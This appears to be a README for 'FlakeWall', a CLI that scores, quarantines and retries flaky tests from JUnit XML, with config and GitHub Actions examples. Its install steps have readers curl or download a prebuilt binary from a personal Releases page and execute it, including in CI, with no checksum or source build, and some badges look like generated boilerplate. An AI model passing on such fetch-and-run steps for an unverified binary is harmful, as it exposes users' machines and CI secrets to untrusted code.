[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=flat-square)](https://github.com/billahtelecom/flakewall/releases)

# FlakeWall — Flaky Test Guard for CI, Retry & Quarantine

🧪 🔁 🛡️

Short, language-agnostic tool to handle flaky tests in CI. Parse JUnit output. Score flakiness. Quarantine flaky tests. Retry tests for pytest and Jest. Small CLI built for CI pipelines.

Badges
- [![Releases](https://img.shields.io/badge/Releases-View-blue?logo=github&style=flat-square)](https://github.com/billahtelecom/flakewall/releases)
- ![Topics](https://img.shields.io/badge/topics-ci%20%7C%20cli%20%7C%20flaky--tests-lightgrey)
- ![Language](https://img.shields.io/badge/language-language-9cf)
- ![License](https://img.shields.io/badge/license-MIT-green)

Why this tool
- Find flaky tests across languages. The tool reads JUnit XML from many test runners.
- Assign a flakiness score per test. Use score to decide quarantine or retry.
- Integrate into GitHub Actions or any CI with a small CLI.
- Support for pytest and Jest retry hooks out of the box.

Quick demo image
![CI workflow image](https://img.shields.io/badge/CI-ready-true-brightgreen)  

Features
- Parse JUnit XML produced by multiple runners.
- Compute repeatable flakiness score for each test.
- Mark tests as quarantined via a small JSON or YAML file.
- On CI, rerun flaky tests up to N times with exponential backoff.
- Provide a CLI to list, score, and quarantine tests.
- Output machine-readable reports for dashboards.

Install

Download the latest release binary from the Releases page and run it:
- Visit or fetch the file at: https://github.com/billahtelecom/flakewall/releases
- Download the correct asset for your platform and execute it in CI.

Example Linux install
```bash
# download the release asset (replace with actual file name from releases)
curl -L -o flakewall.tar.gz https://github.com/billahtelecom/flakewall/releases/download/vX.Y.Z/flakewall-linux-amd64.tar.gz
tar -xzf flakewall.tar.gz
chmod +x flakewall
./flakewall --help
```

Example macOS install
```bash
curl -L -o flakewall.zip https://github.com/billahtelecom/flakewall/releases/download/vX.Y.Z/flakewall-macos-amd64.zip
unzip flakewall.zip
chmod +x flakewall
./flakewall --version
```

Example Windows install (PowerShell)
```powershell
Invoke-WebRequest -OutFile flakewall.zip https://github.com/billahtelecom/flakewall/releases/download/vX.Y.Z/flakewall-windows-amd64.zip
Expand-Archive flakewall.zip
.\flakewall.exe --help
```

If the link does not work, check the Releases section in the repo.

Quickstart

1. Run your test suite in CI to produce JUnit XML. Most runners support JUnit output:
   - pytest: pytest --junitxml=results.xml
   - jest: jest --reporters=default --json --outputFile=jest-output.json plus a JUnit reporter plugin that emits XML

2. Run flakewall to parse and score:
```bash
./flakewall scan --junit results.xml --out report.json
```

3. Auto-quarantine or list flaky tests:
```bash
# Suggest quarantine for tests above threshold
./flakewall quarantine --report report.json --threshold 0.6 --out quarantine.json

# Print a human report
./flakewall report --report report.json
```

4. Retry flaky tests in CI:
- Use the quarantine file to skip quarantined tests.
- Use the retry runner for pytest or jest to rerun only flagged tests up to N attempts.

CLI overview

Main commands
- scan: Parse JUnit XML and produce per-test stats.
- score: Compute flakiness score based on history and current run.
- quarantine: Add tests above a threshold to quarantine file.
- retry: Run retry strategy for supported runners (pytest, jest).
- report: Generate human and machine reports (JSON, JUnit, SARIF).

Flags (examples)
- --junit <file> : Path to JUnit XML file (required for scan).
- --out <file> : Output file for reports or quarantine list.
- --threshold <0-1> : Flakiness threshold to quarantine.
- --retries <N> : Number of retries for retry command.
- --runner <pytest|jest> : Runner integration to use for retries.

Flakiness scoring (how it works)

FlakeWall uses a simple, deterministic score:
- Each test has a run history. Each run is Pass, Fail, or Error.
- Score = (fails + errors) / total_runs, where older runs weight less.
- The tool applies exponential decay to older runs to favor recent behavior.
- Score ranges 0.0 to 1.0. Higher means more flaky.

This approach stays simple. It works across language ecosystems. You can tune decay and thresholds in a config file.

Quarantine format

Quarantine file is a JSON or YAML file that lists test IDs. Example (JSON):
```json
{
  "version": 1,
  "quarantined_tests": [
    {
      "id": "tests/module::TestCase::test_flaky_behavior",
      "score": 0.78,
      "first_seen": "2025-04-10T12:00:00Z",
      "reason": "flaky-high"
    }
  ],
  "meta": {
    "generated_by": "flakewall",
    "generated_at": "2025-08-18T08:00:00Z"
  }
}
```

CI integration

GitHub Actions example snippet
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests with JUnit output
        run: |
          pytest --junitxml=results.xml
      - name: Run flakewall scan
        run: |
          curl -L -o flakewall https://github.com/billahtelecom/flakewall/releases/download/vX.Y.Z/flakewall-linux-amd64
          chmod +x flakewall
          ./flakewall scan --junit results.xml --out report.json
      - name: Retry flaky tests
        run: |
          ./flakewall retry --report report.json --retries 2 --runner pytest
```

Jest integration
- Use a JUnit reporter plugin or a jest reporter that emits JUnit XML.
- Run jest to produce XML, then run flakewall scan.
- Use flakewall retry with runner jest. The tool rewrites a test list to rerun specific tests.

pytest integration
- Use --junitxml to produce XML.
- Use flakewall retry with runner pytest. The CLI builds pytest -k filters or reruns with files.

Outputs and reports

FlakeWall writes:
- report.json: per-test stats and scores
- quarantine.json / quarantine.yaml: quarantined tests
- console output: human-friendly summary
- JUnit-compatible artifact (optional) that marks quarantined tests as skipped

Use the JSON report to feed dashboards or to block merges if flaky score rises over threshold.

Example report snippet
```json
{
  "tests": [
    {
      "id": "tests/unit/test_x.py::test_alpha",
      "runs": 10,
      "fails": 2,
      "score": 0.25,
      "last_run": "2025-08-17T14:00:00Z"
    }
  ],
  "summary": {
    "scanned": 120,
    "flaky": 6
  }
}
```

Best practices
- Run flakewall in CI after a normal test run that produces JUnit XML.
- Store quarantine file in a location that your CI can read and your test runner can use to skip quarantined tests.
- Revisit quarantined tests weekly. Quarantine protects CI stability but is not a long-term fix.
- Keep history; flakiness needs context. The tool uses history to avoid false positives.

Troubleshooting
- If JUnit parsing fails, verify the XML is valid and matches JUnit schema.
- If tests show as unknown, ensure the test ID format matches the runner’s output.
- If retries fail, check runner-specific flags and that the CI environment can rerun tests.

Config file (optional)
You can put a flakewall.yml in repo root:
```yaml
decay: 0.85     # older runs multiplier
threshold: 0.6  # default quarantine threshold
retries: 2
runners:
  pytest:
    cmd: "pytest --maxfail=1"
  jest:
    cmd: "jest"
```

Security and execution

Download the release asset from the Releases page:
- Get the correct binary for your OS at https://github.com/billahtelecom/flakewall/releases
- Make the binary executable and run it in your CI environment.

If the releases link does not work, check the Releases section in the repo.

Contributing

- Open issues for bugs or feature requests.
- Send PRs that include tests and short, clear descriptions.
- Keep changes small and focused. Use the same test JUnit format the project expects.

Repository topics
ci, cli, developer-tools, flaky-tests, github-actions, jest, junit, pytest, quarantine, test-retry

License

MIT License. See LICENSE file in repo.

Contact

Open an issue on GitHub for breaking changes or questions.